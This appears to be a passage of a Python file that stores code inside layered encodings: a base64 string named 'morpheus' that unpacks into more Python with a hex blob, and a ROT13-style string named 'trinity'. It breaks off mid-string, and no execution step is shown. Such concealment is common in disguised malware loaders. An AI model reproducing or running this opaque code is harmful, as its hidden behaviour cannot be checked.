import base64, codecs

morpheus = 'aW1wb3J0IGJhc2U2NCwgemxpYiwgY29kZWNzLCBiaW5hc2NpaSwgc2l4Cgptb3JwaGV1cyA9ICc2NTRhN2E0ZTY2NTY2ZDU0NzU3MzcxNTczNzJmNzYyYjQ2NTA3NDc0NjQzODY2NzAzNjQxNTk3MzM2NmQ3NzY5NjI3NDM4NDk0MjMwNDE1MTQ4NDI2OTU2NGY0MzJiNDM3MzMwNzk1NzQ5MzMzNzM2NzUzMTU5NmQ0OTQzNzA1NzJiNTQyYjZlMzkzNDMxMmI0OTQzNzc3ODc5NTc0NzRlNzYzNTU4NmI1NzcyNTc0ZjMwNzU1NDcyMzg0YzczMmYzMzYzMzgyZjUwMmYzNzZhMzk3OTQzNWE3YTU5NTAzOTYyMzczOTQ2Nzk1NjY1MzY2ZDY4MmYzMzc2MmYyZjMzMzczMzM4NmY2MTMyNTg2NDQ3NjE1ODU3MzE0NzU4NTA3NjZkNzc3NjU0NjM2ZDc3Mzc1ODVhNGM2ZTM0MzYzOTU1NGE0ODM2NTQ0MjQxMzU0YjM5Mzg0ZTZhMzEzNzU3MzI3NjY4Nzk0NzUwNzI3ODM2NGU2NzVhNGE2NjMxMzI3MTQ5NWE2NTM1NDc1MzY1NzkzMjJiMzg3MzY2MzQ0YTM5MzU1YTRiNzUzNzZkNjM2NDY3MzA2ZDM2NDM1MTZlNzI1NzQ3NjM2NjRmMzU3OTMxNjE0OTc3NmU0ZDZkNTQ2ZjM5Mzk1MTU5MzQzMTYyNGQ2MjM1Mzc1MDZlNmM2NDY0NjU1ODQ2NmYzMDRkNjc1MzM4NjU1YTRjNDY3NzMxNjQzODU4NGQ3NTczMzA0NDM5NGQzOTM1NGE2ZTc1NjQ2NDY0NTY3NzM0NzI0YjcwNDg3NzU1NDg3NjYyNTA3Mzc0MzU2NDRkN2EzNTQ2NTg2MTVhNDMzMTdhNmI0NTZiNzg0NTQ1NmI0ODUyNTEzNTc2NDM3MTc5NDIyYjUwNjI3OTM0NDE1NDZmNmM2YzMzNzQ2NzZmNjkyYjM2Njk0OTQ5NjE1MDQ5MmY1YTUwNzY0ZjZjNjU2YzRmMzA3NDZlMzg3NTZmMzA0NzM0MmI1NzQ1MzU2NjZlNDY1Nzc3NTQ3MTc5NzMyZjRlNmU2OTc0MzM1NzRjMzg0ZDM5NGY0NDMzMzA0ZTQ2NjQ2YTM1NmQ3MzZlNGY2Mzc0NTY3NDZlNjIzNjc3NjU3MDZkNGY0NDM4NTY3ODM0NGE3NDM0NzU0YTJiNGQ1NzMwNDM1ODYzNTQ0Njc4MzEzNzM1NmQ3NDJmNTc1MTYzNDg0MjU1NzA1MDRkMzM0ZDQ2NzQ3YTM3NTc0MTRhMzk3NDc0NGQ3ODMwNjk2YzYzN2EzODU5NDczOTQyNTU3OTUxNGQyYjU2NDgzNDMxNGY2NjZiNGU1YTJiNzEzNjc3NmU2MjZmNjU2YTJmNjU1NjcyNmU1MDMwNWE0MzY0NTQ3NTZiNTk0MzY2NTQ0NTM0NDY3MTdhNzAzNTRiMzE2MjdhNDI1MjZmNjIzODY4MmY0YzY4MzE3NTc0NTk0YTM1MzI0ZjUyMzczNzQ3Nzk2ZDU3NjM3NjdhNDc3YTYyNjM0MjMxNmYzMTZiNTEzNTJmNGM3NTMyNzU3MzM4NTkzNTRiNjU0OTZjNmU1ODQ0NGY0ZDY1NDQ3Mzc2NTM0YTM1NTk1MjQ0MzM1NTM1MmYzNzU3NGY3MjcyNGQzODc4NjI1ODc3NjEzMDMzNTg1NTcxNGYzMTc0NDY1NjZlNmU2NzM1Mzg2ZjMzNTczNDcyNTAzOTYzNGU1YTRhNDc1ODYxNzU2ZDU1NDIyZjY2NzI3NDY5NGU0NDJmNTUzODc1NDUzNjM4NTI2YzZhNzY0ZTQ5MzQ0YzU2NDk3OTRjNzg0ZDYxNGQ3ODZiMzcyYjc5MzM2ODU5Mzc0Njc0NmE3YTU0MzU3Mjc0NDEzODMxNGY3NzYyNjgzMjQxNmUzNzQyNTc0MTMzNjc3MjcwNTgzNTU4NzA3YTRiNzg3NjYxNzk0Mzc4NmQ2NzM1NDczNzY1MzI0NTM2NDM0NjMxMzA2ZDU3NWE3NTdhNzMzNTMyNTk3YTc3N2E2ZTcwNmQyYjVhNDY0MjMxMzU2MTc0Njk0MzYxNzQ3MTYzNjEzOTZkNjczNTQzNzI2NjQxNzY3ODU4NTE2MTM3NzU2Mzc3NjQ3MDM4NTYyZjZmNDMzMjcxNTI0MTY3Nzc2MTRkMzg1NTU2MzU3NTQ2Nzc2MTQ3MmI0ZTY3NjQzOTU4NTQ3NjRjNzY3NDc0MzA0NjZkNDY2NTY3NDg3ODc0Nzk2NzQ0NTA2NzYzNzM3ODc3MzE1NjQ0Mzc2ZjQ3Njk2NDc0MzIzMDM4NDQzNDQzNmU0ZDRkNjY1ODQ4NzI1NjRkNTE3Nzc4NjkzMjU5MzA0ODYyNTc0ZDMwNDM1NzQzNzQ3NDUwNzk2ZTYxNTIzMDU2Mzc2NjY3NTY3OTU0NDc1MjU5NjE1NDM4MmI2ZDMwNTk2NzY0Nzk0MjdhMmY1Nzc3MmI0MjcyNmU0YTJiNGQzMTMwMzM0NTcxMzg3MzU4NGI2MzYzNGY3MTQ3NTA2NzRmNzk2YTdhNzI1NTU1NDI2YzQ2Mzc0YzY0NDg0OTQ2NzQ2NTcyNGEzNjQxMzM3MDczNjc0NDczMmI3NzRlNmQ2NzYyNmU2ZjQ1NTg2ZDUyNjE3MDRiMmI0MTVhNDg1NTczNGY1MTUxMmI0NTQ0NDc1Njc2MzQ2ODcwNmE2YjRjMzM0NTZjNzE1Nzc0NDI2NjRjMzQzMzYyNjc2NzYyN2E3MzJmNGQ2YzYxNjU2NTM3MzY0ZTRiMzY2ZTcwNGU0ZjRiMzM0NTM5NjY1YTY2N2E3NDZlMzA0OTMwNzgzMTMxMzk1MDczNzY3NDMxNmE2ODZiMzY2MjM2NDI1NDU0NTA2NzVhNmM1ODRkNmE2NTZhNGQ2NjRkNjIzMTc5NGM0ZTQxNzg2YjRmNTY0ZTYzNGIzNzY1NDUzNjM0Nzc2Mjc0NmI2ZTM2NDM2ZTQ5NzUzMzQzMzQ3NTM5NjM3NzczNzE2ZTRjNzgzNDJmMzM1YTZkMzY2Njc1NjIzODU4MzM3NjU1MzE0MTdhNzAzNTMxNjY0NzM3NTI2YTVhNzgyYjJiNDU2YjZiNmE2MjU0NGQzODcwNDM2NDU2N2E2ZTRkNmY0ZDMxN2E3MjcwMzY2NDUxMzM1ODM2NTg2ODVhMmY2NjM0Nzg2OTY0Njc0ZTU4NTM2NTU2Njk1OTQxNGM1MDM3NTM0OTUwNjMzMDY5NzM0MjMwMzM3NjY5NTM3YTcyNmU0NTQ3NjU2ZjQ1Mzk0ZjM2NTM2NTZkMzYzNjQzNWE2MzZjNjIzNzUwNGQ0OTRmNzMzNjY4Mzc0ZTdhNmQ0YTcyNDg2NTMyNDE2YzRjNDg2ZTU0MzczNjYyN2E0ZTY3MzgzNjQxNmE2YzVhNmY1MDY4NzU3MjY1Mzk0NDUwMzk2MjY5NDIzOTRmMzMyZjUxNmU3MzMxNDQ0YjQyMmYzMDQ0NTY2OTQ3MmI0NzM1NzI2NTYzNTM2NjZkNTI2YTYyNjg1ODRmMzIzMDMyNjgzNTQ1MmY0Nzc4MzkzNzU5NGI0ODJmNzY3NDU2NTc1MTY3NjQ1NjY5Nzc2NzZjNzc1NDMxMmYzMzUyNmI1MzUwNjc0MTYxNjc3MjJiNzQ1NzMwNTczNDQyNjM3NjcyNTI0MTM3MzI1OTc5MzM1OTM2Njc0NDQ2Nzk1NzU5MzM3OTc1NTkzMTYzNTM3OTZjNzQ1MDcyNmU0MTVhNzMyYjM2NTQ3NTYxNzY1NTYzNWE1NzZmNTE2MjM5NmI1NDQ4NGQ1YTU5NzgzOTcxNTI2ZTcxNGM2NDU1NzQ0NzQ5NjY1MTdhNWE2MTMyMzEzNzRhNzY3MTZlNjM1YTdhNGE1NTRlNmY2ZjM4NmM3YTc0MzM2ZTZhNDQ0MTQ5NDI2NTY4NzY2ZDU3NDE2NjZlNjg2ZTM2NzU3MzUxNTU2MTM5NTk3NDVhNmE2MTc3NTc0NTRkNjQ0ZDY2NWE3OTYxNDY0YTJiNjE3NDc2NGMzMDQ3NDQzNDZmNTM0ZjQ3NDg2MzRmMzg0Nzc5NzM0NDRmMzczOTQ4NzY1YTc2NGMzNjZkNDc1MzM4NjY2OTM4NjE2ZDMyMzk0OTU2NmIyZjM4NmM1MjMyMzE2YTRkMzM3NzRjMzc2YjY5NTg3NTM1NjU3MTRmNDM3NDcwNGY2YzRhNTE3MjY0NTg2ODc0MzQ0ODM4MzI3NTUwNTM3NTcwNzI2NzU2MmI1NjMxNmU3NjU3NzQ3OTZhNDYyZjY3NjY3MzRkNzY1MzdhNmE0ZjQyNDYyYjMyNWE1OTZiNmMzOTMwNTcyZjRkNmE3MjM0NzM3MjQ5Njc1MDZiNDMzODZlNjU0MzYxMmI2Zjc5NDczMTcyNTQ0MjQ3NDE0YzRjMzA0MTU0NWE2MzZhNTk0ZjQ4NjY2OTZkNzQ2YTU3Nzg3NTMxNjQ3OTZlNGU0MTU0NjY3ODVhMzY1NjQ0NzI0ZTU1NDc3NzY0NDI3YTY2Njc0OTVhNTA0OTc3NDc1OTM4NTMzNzQxMmYzNTJmNjY3NzRkNmE3MzMyNDM2MjJiMmI3NjcwNjg0ODUzNzM2ODZlNTA0NzM4Nzc1MzcyNmM2OTRjNTk0NTM0NTI0MzdhMzU3MDY0NTE0MjY2NDQyZjM0Njg0NDU0NTc3MTUzMzA2NjM4NDQ2YTQ5NWE2YTY4NzY2NzJmMzk1OTcyNGQ2ZDM3NTAzMzQ0Mzc1MDQzMzM2NzQ4NjY3NTZmNGQ3NTY5NTQ0ZTM1NTgzNDQ5NjQ3MDY2MzQ0YjY2NTI1MjMzNzU3NDMxNmM0ZjRkNTY2MTMxNDczNjM5MmI3NTM1MzA2NjY5MzgzOTQyMzc0NzdhNTg2ZDM4MzkzNzZlNjc3MjY4MzM3OTMwNjQ2ZjRiNzQ2ZDZlMzM3MDVhNzY3MzdhNzg0MjU4NjY0ZDc5NTI1Njc5NGEyZjM4Njk1MDMwNjk2MjRkNTYyYjUwNGQ0NTc4Mzc1OTY5MzQ1OTY5Nzk0ZDRmNDU2YjMwNDQzOTMxNGU2NTQ1NGY2ZjcyMzE2YzU1NDUzNDQ3NTA3MzY1NmEzMzZhNmYzMjM0MzQ2OTY3NTQzNTU2MzczMDQ3Mzk2MzM1NTY0ZjRjMzY3MjYxNTkzMjMyNGQ0ZjM4NGE0NjcyNDgzMDY1MzU1NDM2NmE1OTZkMzU2MjY4MzY0ZDU1N2E2YzU4MzY2MjQ2MzE2YTU4NTI3NTZkNDk3Nzc0NDE3NDYyNDg2ZjdhNDczMTZmNzM3MjQyNDgzODY1NzY3NTM4NDI0ZTZiNDM1NDQ4NDk0Nzc2NzgzODU3NTA3MTY2NmY0MjMyNTEzOTU3NTA2MjYxNGQ3ODVhNzM0ODQ3NGIzNTQ0NzYzMTY0MzI1MDZmNjM0NzM5MzUzODVhNzA0NDQzNTc2YjRjNGI2ZjMxNDc3MDMzMzQ0NDU0NzI2YjQ2NzU1OTMwNDg2NTQxNjM3NTRlNmM2ZjM3NTQ2Yzc3N2E1MTMwNTY0YTJmNjEzMjUxNzk3NDM1NDc2NDc3NzYzOTM5NzYzMTVhMzY2ZjUyMzk0MzZkNzU0ZDZlMzk2YjJiNjY1MjYyNzQzMTdhMzkzOTY5NjY0Nzc5NzIzMzM4NmUzMDcxMzc1ODY1Nzg3MTJmNTk2ZjcxNjUzMTMwNzI1NzQxNDQ2YTVhMzA1OTY4NGY2ZDZmNTA3NDJiNGE0OTQyNzY2ODY2NmU1OTU5NGU0ZTRiNjY1Nzc3Nzg1MTYyN2EzOTY2NGU0MjY2MzQ2YjY1Mzg3OTcyN2E3NjMxMzk2ZjQ4NTg2YzRjNjU2NzUyMmYyYjMxMzk2NTM5MmY0ODYyNjQzMjM4NzA1OTYxNDkzODQxNzA3YTcxNDg3NDM5NjQ0Zjc4MzA1MjJmNDc1MzZiNzk2NjM1NzI2NDVhNGM0NjczNDQ3YTY5NjQ2NjM3NDQ2Njc1NjYzODQzMmYzODUxNGE1OTRkNjU2ODY2Mzk0NDQyNzE2MTczNjM0YjJmNmE3NDM2NGQ0ODY2N2E3NDY4NDEzMzQ2NmE3ODZkNTMzMDY1NzM2MjZmNjY0MzZmNmE0NDU4NzEyZjM1MmY0ZjMyNjE3YTMzNTA1MTU3NjQ0MzJmNzg1OTU0NjcyZjJmMzQ2NTYyNDczNDc1MzEzMzU0NGYzNDRhNzM2NzU4NmQ2Yjc4NDQyZjRkMmI1NDM4NjIzOTYxMzQzNTM1NzU0YjcyNGY1NDdhNmQ0ODcyMzMzNDQ4MzM0Yzc3NDg2MjRjNDc1OTQ1NjQ3NjZiNTU2NDc1NTUzMjU2MmY3MTVhNzIzOTUyNTk1NzM3NGY1Njc0NDk2NDMyMzE2ZTU5NmE0MzUxNjI3ODUwNTk0ODU5NDU1MDU0NDUzOTZhN2E1YTRkNGI3NDczNzAzNjczNzAzNzZkNjQ0MjJiNzc2MTQ4NmY0NjU3Njc0ODMxNmU1OTYxMmI2YTU4Mzc1NTMyMzQ0ZjRlNGU2YjQyNDkyZjRiMmY2MzU0NzM0YjZkNjI2ZTZiNmUzMTQ0NjYzMzQyMzQzOTZhNTU2NjcxNTc1NzM0Mzc1MjQ3NDY3MTc2NjE0OTRhMzg0YzVhMmI3NTU5NGU2ODRkNGY3MjU0NTc0ZDMzNjE0NTc5NDQ0ODM3MzQ0ZTRmNTg0MzMwNDE1NDRkNmEyZjRkNmM0ZDVhNmY2YjY3NDgzODU2NzY3MTYxNzU3MzM1NzM0MTRhNzI1MzZiMzI1NzY4NTU2MTU1NjY2YjRjNzU2ZjQ0Mzc3OTQxNzU0NTZjNjM1MTZhMzQ0NTc2NTg2YzY2NzM1OTMwNDcyZjRhNzY2MTUwNzU0NjM5NjY2ZDc1NDk0NjVhNDY2NDZmMmI0ZTQ4NmM1MjRlNzM3NjRiMzk2ODY4NDI2ZTU5NGIzMTc0NzA3NTQ2NjU1MDMyNGE2YTYzNjQ1MTQ1NTI2Njc5NDc1NTRjMzQ2ZjcyNTQ2YTQ1NTA2MjRjNTczMTUyNjQ2YTMyNDk1MjUyNTIzNTc3NmY0MTc0NGY1NTQxNjM2YzMwNGM2MzY5NjQ2ODc1Njk2NjQ4NTY3OTQ0NTY0ZjZiMzg2ODUyNDQ0OTZlNDU0OTRhNTM2NjRhNGI1OTc0Mzk1YTU0MzQzNzdhNDU3MjUxNDQ3NzVhNGQ2ZDUwMzI3YTc5NTQ2NzZlNGMzMjMzNjY3NDQ0NjQ2MjZhMmYzMDQ5NTUzNDQ2NjI0YTcyNGY0YTRjNTM0YzUwNGY0Nzc0NDE1NDUxNDg3YTQ4NDI2MjcyMzA3ODc3NDU3NTZkNzI1MjM1MmY1YTQxMmIzNTZjMzQ1YTZiMzg2MjZkNTgzMjQzNzU0YjY3NGU3NDcwNjg0OTc1Mzg0MzZiNTIzMzc3NTA2MjRlNzg0ODMzNzg2YzRiMmY0ZDYyNGIzMzM3NGQ2NzUxNzk0NTc3NmQ1OTRiNGQ2NTQ3MzA2ZjUxNzQ0ZjQ2N2E0MTQ1MmI2YTQ1NTcyYjcwNDc0NjczNzc0ODc4NGUzODU0NjEzNTYyNGQ1MTQ2Nzc0NzJiNDM1MzQ4NGY2YzQyNmE1MDU5NzMzNzY3NjczNDZjMmY0NzcwNzA0MjMzNDg3NTMwNzU3ODdhNTE0ODJiNTk0ZTRkNzY1NDQxNTAyYjY3MmY0ODc4MmI2NTZhNzk2NDZhNjgzNTZiMzIzNzJmNTQ2NzMyNjE2MjUyMmIzMTY2NTA3NjU1NTE1MTc5NzgzODY4NTA2YzZiNDE3MDZhMzg1MzU4NDM0ZTM2NGIzNzJiNGM3NTUwNTgzNzM5NmY2ODYyNmI1YTYyMzQ1NzY0NGQzMjMzMzE2Mzc3NDY0ZDJiNmMyZjRiMzczNDMwNTA3MDJiMzQ3YTM0N2E1MTVhNzk1OTQ1NTc3ODQ2NjU0YjQ3NjU2ZTMzNDU0ZTM1NTQ0ZTJmMzgyYjMxNjQ3NTc2NjI1ODM4MzU1NjU5NmE0NDU2Njg2N'
trinity =  'wD1ATZ2ZwMxAzH1BGD1AGDmBGZ2ZmR3AQH4ATZ2ZwH5ATZ1LGHkAmNmAGZ5ZzV1AGp4AzD2BGEwA2R0AGZ4AGplMwZ5Zmp0Awp0AGD1ZGWvZmVmAmWvAGD3LGMuAzV3ZmHlZmZmAwpkAQp3ZwLlAwHmBGp0AGp3BQH3AQHmZmH0AQL0MGp0AGt3LGEyZzV0AQH5AGx2LGZlATRlMwMzAGZ0ZmZ3AGt3AGEvAwH3BGDlAGV3AmLlZzV3AGp0AGL3LGL4AwD0LwZmAmtmAmHkAQp3AwD0ATVlLwL1AGHmBQD4AmL3ZwZ1Awt3AQZ5Amt3ZQLmZmZ2AQD3ATVmBGMwAmpmAmMwZmL2LGMvAQVmAGZ3Awp2BGD5AQL1ZmD4AGp1AmLlAQLlLwL0ATZ2BQHmAQp1BQp5AmN2AmquAGHmAQMxZmtmAmH0AwV3LGL3ATD3AmLlAwxmAQD2ZmD1LGp5AwD0LwWzAmLmBGLlAGZ1ZmIuAmp3AGD5AwRmZQWvAQVmAwD4AQZ0ZGH5ZmH2Lmp2AwH0BQEwAGt1AQL3ATL2ZwDmZmZ3Zwp3ZmH1ZQL1AmVmBQZmAzD3AmD1AGH2BGLlAQp0MwL2AzH0MGZkAzL1Zmp4ATVmAGMvAzHlLwL5AQL0LmDkAQL3AGH4AmRmZGDlATR3LGHjAwZ2MGZjAQLmAwZmATH2MQH2AQLmAmEvAzZ0MGpmZmD3BQZ5AGL1AwL3ZmR3LGMzAmLmBQL2AzLmZGp3ATZ2BGH0ZmV0AQZ3ZzV0AmpmAwx1BQL0ATH1LGL1Amt2Mwp2ZmV3LGL2AwZlLwH4AzL1AwL0AQZ0ZwMzAmD0Amp0AwL1AwZ5ZmR3AQMyAQtmAwZ2AQV3AQEwZzV0MQH4Zmt1AGp5AQx3ZmHmAQR1AmHlAGNmBQZ3AGZ1AwD2AzD3ZQpkAmx1ZGZlATV3AGZkZmp0AwHjAzR1LGWzAQD2AQLmAQR2ZGEuAmR0AGDkZmV0AGDmZmx2AGL5AJR1ZQHjAmtmZmL4AQH2MGD0AzHmBGWzAmL0MwZ1ZmL0LGp5AGV2AQZ4AGRmAQZ3AmVmBGZkAQR1ZQL1AwH1AmZmZmNmAmHkAQp2LmL3Amx3AmL0ZmD1BQp0AQZmZGZ2Awt2AGZ0AGt3AwMxAzD1AGD4AmN1ZmZ5ZmD1LGEwZzV2Zmp4Amx0BGLlAQH3LGExAGx2LwIuAzL2B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